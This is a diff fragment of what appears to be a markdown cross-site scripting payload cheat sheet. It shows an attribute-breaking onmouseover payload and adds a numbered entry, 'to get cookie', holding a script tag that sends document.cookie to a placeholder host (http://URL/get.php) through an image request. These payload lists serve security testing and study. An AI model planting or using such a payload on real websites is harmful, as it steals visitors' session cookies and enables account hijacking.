@@ -44,7 +44,7 @@
 
 15- `" onmouseover="alert(1)` &nbsp;  &nbsp; |  &nbsp;
 
-16-
+16- `<script> var i = new Image(); i.src="http://URL/get.php?cookie="+escape(document.cookie)</script>` | __to get cookie__
 
 ### Extra Resources:
 
